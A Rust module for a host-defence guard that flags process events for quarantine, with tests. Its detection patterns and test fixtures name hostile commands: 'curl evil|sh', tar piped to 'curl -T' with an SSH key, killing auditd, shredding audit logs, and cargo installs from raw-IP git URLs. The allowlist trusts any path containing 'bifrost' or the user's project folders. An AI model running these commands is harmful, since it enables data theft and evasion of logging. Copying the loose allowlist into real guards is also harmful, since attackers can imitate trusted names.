//! Non-negotiable quarantine signals — before TRUSTED_PATH bypass and model inference.

use super::event::{normalize_proc_name, parse_guard_event_fields};
use super::never_fast_trust::matches_never_fast_trust;

const SCRATCH_PREFIXES: &[&str] = &["/tmp/", "/dev/shm/", "/var/tmp/"];

pub fn parse_guard_cmdline(event: &str) -> String {
    event
        .split_once(" cmd:")
        .and_then(|(_, rest)| {
            rest
                .split_once(" time:")
                .or_else(|| rest.split_once(" behavior:"))
                .map(|(cmd, _)| cmd.trim())
        })
        .unwrap_or("")
        .to_string()
}

fn touches_scratch(s: &str) -> bool {
    SCRATCH_PREFIXES.iter().any(|p| s.contains(p))
}

fn touches_hidden_scratch(s: &str) -> bool {
    s.contains("/tmp/.") || s.contains("/dev/shm/.") || s.contains("/var/tmp/.")
}

fn touches_credentials(s: &str) -> bool {
    let lower = s.to_lowercase();
    lower.contains("/etc/shadow")
        || lower.contains("/etc/gshadow")
        || (lower.contains("/etc/passwd") && !lower.contains("/etc/passwd-"))
}

fn comm_is(comm: &str, name: &str) -> bool {
    normalize_proc_name(comm) == name
}

/// Own-stack paths that must never hit hard quarantine (jeTT, bifrost, benign cargo in /tmp).
fn is_own_stack(event: &str, comm: &str, exe_path: &str) -> bool {
    let lower = format!("{} {} {}", comm, exe_path, event).to_lowercase();
    if lower.contains("jett-control.sh") || lower.contains("/opt/jett/") {
        return true;
    }
    if exe_path.contains("/bifrost/") || lower.contains("bifrost") {
        return true;
    }
    if exe_path.contains("/home/cosmic/Projects/")
        || exe_path.contains("/home/cosmic/Scripts/")
    {
        return true;
    }
    if comm_is(comm, "jett") || exe_path.to_lowercase().contains("/jett") {
        return true;
    }
    if exe_path.contains("/tmp/cargo-install") || exe_path.contains("/cargo-install") {
        return true;
    }
    // Benign cargo install in scratch — not --git from raw IP.
    if lower.contains("cargo") && lower.contains("install") && touches_scratch(&lower) {
        if lower.contains("--git") {
            return !git_url_uses_raw_ip(&lower);
        }
        return true;
    }
    false
}

fn git_url_uses_raw_ip(s: &str) -> bool {
    for prefix in ["--git http://", "--git https://", "http://", "https://"] {
        if let Some(rest) = s.split(prefix).nth(1) {
            if rest
                .chars()
                .next()
                .map(|c| c.is_ascii_digit())
                .unwrap_or(false)
            {
                return true;
            }
        }
    }
    false
}

fn lolbin_systemd_run(cmdline: &str, event: &str) -> bool {
    let lower = format!("{} {}", cmdline, event).to_lowercase();
    let spawns_shell = lower.contains("bash") || lower.contains("/bin/sh") || lower.contains(" sh");
    let remote_fetch = lower.contains("curl") || lower.contains("wget") || lower.contains("|sh");
    spawns_shell && remote_fetch
}

fn lolbin_at_cron(event: &str, comm: &str) -> bool {
    comm_is(comm, "at") && event.to_lowercase().contains("/etc/cron.d")
}

fn lolbin_dbus_startunit(cmdline: &str) -> bool {
    cmdline.contains("StartUnit") && cmdline.contains("org.freedesktop.systemd1")
}

fn supply_chain_npm(cmdline: &str) -> bool {
    let lower = cmdline.to_lowercase();
    lower.contains("fake-backdoor") || lower.contains("node-fake-backdoor")
}

fn supply_chain_cargo_git_ip(cmdline: &str, event: &str) -> bool {
    let lower = format!("{} {}", cmdline, event).to_lowercase();
    lower.contains("install") && lower.contains("--git") && git_url_uses_raw_ip(&lower)
}

fn exfil_sensitive_outbound(event: &str) -> bool {
    let lower = event.to_lowercase();
    if !lower.contains("sensitive_files:") {
        return false;
    }
    let outbound = lower.contains("outbound_connections:");
    let curl = lower.contains("curl");
    let tar_or_pipe = lower.contains("tar") || lower.contains('|');
    outbound && curl && tar_or_pipe
}

fn defense_evasion(haystack: &str, comm: &str) -> Option<&'static str> {
    let lower = haystack.to_lowercase();
    if lower.contains("killall") && lower.contains("auditd") {
        return Some("killing audit daemon");
    }
    if lower.contains("shred") && lower.contains("audit.log") {
        return Some("shred audit log");
    }
    if lower.contains("systemctl")
        && lower.contains("mask")
        && lower.contains("journal")
    {
        return Some("disabling journald logging");
    }
    if comm_is(&comm, "rmmod") && lower.contains("audit") {
        return Some("unload security kernel module");
    }
    None
}

fn webshell_initial_access(event: &str) -> bool {
    let lower = event.to_lowercase();
    let web_server = lower.contains("nginx") || lower.contains("apache");
    let shell_spawn = lower.contains("spawned_children:[bash")
        || lower.contains("spawned_children:[sh");
    let webshell_marker = lower.contains("$_get")
        || lower.contains("shell.php")
        || lower.contains("system(");
    web_server && shell_spawn && webshell_marker
}

fn ptrace_from_scratch(exe_path: &str, cmdline: &str) -> bool {
    touches_scratch(exe_path) && cmdline.to_lowercase().contains("ptrace")
}

fn persistence_writes(event: &str, cmdline: &str) -> bool {
    let lower = event.to_lowercase();
    if lower.contains("/etc/cron.d") && (lower.contains(">>") || lower.contains("echo")) {
        return true;
    }
    if lower.contains("autostart") && lower.contains("sensitive_files:") {
        return true;
    }
    if cmdline.trim() == "-e"
        && lower.contains("sensitive_files:")
        && (lower.contains(".bashrc") || lower.contains("cron"))
    {
        return true;
    }
    false
}

pub fn hard_quarantine_reason(event: &str) -> Option<&'static str> {
    let (comm, exe_path) = parse_guard_event_fields(event);
    let cmdline = parse_guard_cmdline(event);
    let haystack = format!("{} {} {} {}", comm, exe_path, cmdline, event);
    let lower = haystack.to_lowercase();

    if is_own_stack(event, &comm, &exe_path) {
        return None;
    }

    if exe_path.contains("memfd:") || lower.contains("exe: memfd") {
        return Some("fileless memfd executable");
    }

    if !exe_path.is_empty() && touches_scratch(&exe_path) {
        return Some("binary executed from scratch path");
    }

    if touches_credentials(&cmdline) || touches_credentials(&exe_path) {
        return Some("credential file access");
    }

    let interpreter = matches_never_fast_trust(&comm) || matches_never_fast_trust(&exe_path);
    if interpreter && touches_scratch(&cmdline) {
        return Some("interpreter running scratch-path script or payload");
    }

    if touches_hidden_scratch(&lower)
        && (lower.contains('>')
            || lower.contains("echo ")
            || lower.contains("curl")
            || lower.contains("wget"))
    {
        return Some("hidden scratch-space staging");
    }

    if comm_is(&comm, "systemd-run") && lolbin_systemd_run(&cmdline, event) {
        return Some("systemd-run spawning shell with remote payload");
    }

    if lolbin_at_cron(event, &comm) {
        return Some("at scheduling job targeting cron.d");
    }

    if comm_is(&comm, "dbus-send") && lolbin_dbus_startunit(&cmdline) {
        return Some("dbus-send triggering systemd unit");
    }

    if comm_is(&comm, "npm") && supply_chain_npm(&cmdline) {
        return Some("npm suspicious package install");
    }

    if comm_is(&comm, "cargo") && supply_chain_cargo_git_ip(&cmdline, event) {
        return Some("cargo install from untrusted git URL");
    }

    if exfil_sensitive_outbound(event) {
        return Some("archive and exfiltrate sensitive data");
    }

    if let Some(reason) = defense_evasion(&haystack, &comm) {
        return Some(reason);
    }

    if webshell_initial_access(event) {
        return Some("web server spawning shell from webshell");
    }

    if ptrace_from_scratch(&exe_path, &cmdline) {
        return Some("ptrace injection from scratch path");
    }

    if persistence_writes(event, &cmdline) {
        return Some("persistence via cron or autostart");
    }

    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn python_script_in_tmp_quarantines() {
        let event =
            "python3 PID:1 uid:1000 exe:/usr/bin/python3 cmd:python3 /tmp/behavior_test.py time:1";
        assert_eq!(
            hard_quarantine_reason(event),
            Some("interpreter running scratch-path script or payload")
        );
    }

    #[test]
    fn ls_shadow_quarantines() {
        let event = "ls PID:2 uid:1000 exe:/usr/bin/ls cmd:ls -l /etc/shadow time:1";
        assert_eq!(
            hard_quarantine_reason(event),
            Some("credential file access")
        );
    }

    #[test]
    fn bash_hidden_tmp_staging_quarantines() {
        let event = "bash PID:3 uid:1000 exe:/usr/bin/bash cmd:/bin/bash -c echo x > /tmp/.kernel_fuzz time:1";
        assert!(hard_quarantine_reason(event).is_some());
    }

    #[test]
    fn systemd_run_curl_sh_quarantines() {
        let event = "systemd-run PID:54206 uid:1000 exe:/usr/bin/systemd-run cmd:--unit=evil -- /bin/bash -c 'curl evil|sh' time:1780570826 outbound_connections:[185.220.101.45:4444] spawned_children:[bash]";
        assert_eq!(
            hard_quarantine_reason(event),
            Some("systemd-run spawning shell with remote payload")
        );
    }

    #[test]
    fn at_cron_d_quarantines() {
        let event = "at PID:68859 uid:1000 exe:/usr/bin/at cmd:now + 1 minute time:1757303258 sensitive_files:[/etc/cron.d/.x] spawned_children:[sh]";
        assert_eq!(
            hard_quarantine_reason(event),
            Some("at scheduling job targeting cron.d")
        );
    }

    #[test]
    fn npm_fake_backdoor_quarantines() {
        let event = "npm PID:35610 uid:1000 exe:/usr/bin/npm cmd:install @types/node-fake-backdoor time:1765680035";
        assert_eq!(
            hard_quarantine_reason(event),
            Some("npm suspicious package install")
        );
    }

    #[test]
    fn cargo_git_ip_quarantines() {
        let event = "cargo PID:57621 uid:1000 exe:/home/cosmic/.cargo/bin/cargo cmd:install --git http://45.137.21.9/mal-crate time:1749384560";
        assert_eq!(
            hard_quarantine_reason(event),
            Some("cargo install from untrusted git URL")
        );
    }

    #[test]
    fn tar_curl_exfil_quarantines() {
        let event = ".x PID:138095 uid:1000 exe:/usr/bin/tar cmd:czf - /home/cosmic/Documents | curl -T - 185.220.102.8 time:1780912636 outbound_connections:[185.220.102.8:443] sensitive_files:[/home/cosmic/.ssh/id_rsa]";
        assert_eq!(
            hard_quarantine_reason(event),
            Some("archive and exfiltrate sensitive data")
        );
    }

    #[test]
    fn killall_auditd_quarantines() {
        let event = "rmmod PID:198995 uid:0 exe:/usr/sbin/rmmod cmd:killall -9 auditd time:1754895289 behavior:none_observed";
        assert_eq!(
            hard_quarantine_reason(event),
            Some("killing audit daemon")
        );
    }

    #[test]
    fn shred_audit_log_quarantines() {
        let event = "shred PID:2047 uid:0 exe:/usr/bin/shred cmd:-uz /var/log/audit/audit.log time:1757899998 sensitive_files:[/var/log/audit/audit.log]";
        assert_eq!(
            hard_quarantine_reason(event),
            Some("shred audit log")
        );
    }

    #[test]
    fn dbus_startunit_quarantines() {
        let event = "dbus-send PID:43726 uid:1000 exe:/usr/bin/dbus-send cmd:--system --dest=org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager.StartUnit time:1753610236 spawned_children:[systemd]";
        assert_eq!(
            hard_quarantine_reason(event),
            Some("dbus-send triggering systemd unit")
        );
    }

    #[test]
    fn own_stack_jett_allowed() {
        let event = "jett PID:1 uid:1000 exe:/opt/jett/bin/jett cmd:--guard test time:1";
        assert!(hard_quarantine_reason(event).is_none());
    }

    #[test]
    fn benign_cargo_tmp_allowed() {
        let event = "cargo PID:1 uid:1000 exe:/home/cosmic/.cargo/bin/cargo cmd:install ripgrep --root /tmp/cargo-root time:1";
        assert!(hard_quarantine_reason(event).is_none());
    }

    #[test]
    fn cargo_install_artifact_in_tmp_allowed() {
        let event = ".tmp9371 PID:3813 uid:1000 exe:/tmp/cargo-install638306/release/jett-test cmd: time:1775635384";
        assert!(hard_quarantine_reason(event).is_none());
    }

    #[test]
    fn restic_shadow_metadata_allowed() {
        let event = "restic PID:19144 uid:0 exe:/usr/bin/restic cmd:backup /etc /home --tag nightly time:1765230194 sensitive_files:[/etc/passwd,/etc/shadow]";
        assert!(hard_quarantine_reason(event).is_none());
    }
}
